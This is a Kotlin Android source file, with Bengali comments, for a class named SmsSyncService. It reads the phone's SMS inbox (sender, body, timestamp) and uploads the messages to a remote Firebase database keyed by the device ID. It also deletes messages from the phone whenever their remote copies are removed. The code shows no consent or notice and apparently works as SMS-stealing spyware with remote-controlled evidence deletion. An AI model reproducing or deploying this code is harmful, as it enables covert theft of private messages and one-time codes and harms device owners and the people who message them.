package com.example.aplay

import android.content.ContentUris
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Settings
import com.google.firebase.database.FirebaseDatabase

class SmsSyncService(private val context: Context) {

    private val deviceId: String = Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ANDROID_ID
    ) ?: "unknown_device"

    private val smsRef = FirebaseDatabase.getInstance().getReference("sms").child(deviceId)

    // প্রথম 20 SMS আপলোড
    fun uploadInitialSms(limit: Int = 20) {
        val uriSms = Uri.parse("content://sms/inbox")
        val cursor: Cursor? = context.contentResolver.query(uriSms, null, null, null, null)
        cursor?.use {
            val addressIndex = it.getColumnIndex("address")
            val bodyIndex = it.getColumnIndex("body")
            val dateIndex = it.getColumnIndex("date")
            val idIndex = it.getColumnIndex("_id")

            var count = 0
            while (it.moveToNext() && count < limit) {
                val smsId = if (idIndex != -1) it.getString(idIndex) else continue
                val sender = if (addressIndex != -1) it.getString(addressIndex) else "Unknown"
                val body = if (bodyIndex != -1) it.getString(bodyIndex) else ""
                val timestamp = if (dateIndex != -1) it.getString(dateIndex)?.toLongOrNull() ?: System.currentTimeMillis() else System.currentTimeMillis()

                val smsData = mapOf(
                    "smsId" to smsId,
                    "sender" to sender,
                    "body" to body,
                    "timestamp" to timestamp
                )

                smsRef.child(smsId).setValue(smsData)
                count++
            }
        }
    }

    // Firebase থেকে delete হলে ফোন থেকেও মুছে দাও
    fun listenForFirebaseDeletion() {
        smsRef.addChildEventListener(object : com.google.firebase.database.ChildEventListener {
            override fun onChildAdded(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}
            override fun onChildChanged(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}
            override fun onChildMoved(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}

            override fun onChildRemoved(snapshot: com.google.firebase.database.DataSnapshot) {
                val smsId = snapshot.child("smsId").getValue(String::class.java) ?: return
                deleteSmsFromPhone(smsId)
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
        })
    }

    private fun deleteSmsFromPhone(smsId: String) {
        val smsLongId = smsId.toLongOrNull() ?: return
        val uri = ContentUris.withAppendedId(Uri.parse("content://sms"), smsLongId)
        context.contentResolver.delete(uri, null, null)
    }
}
